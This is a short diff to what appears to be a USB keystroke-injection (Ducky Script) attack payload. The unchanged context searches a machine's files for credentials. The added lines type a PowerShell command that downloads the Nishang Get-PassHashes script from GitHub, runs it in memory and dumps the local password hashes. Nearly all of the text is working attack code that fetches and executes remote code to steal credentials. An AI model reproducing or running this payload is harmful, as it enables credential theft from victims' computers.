@@ -45,4 +45,7 @@ gci * -Include *.xml,*.txt,*.bat,*.ps1,*.psm,*.psd -Recurse -EA SilentlyContinue
 Pop-Location"
 ENTER
 DELAY 200
+REM 	Dump local password hashes
+STRING powershell -c "iex(iwr("https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1"));Get-PassHashes"
+ENTER
 
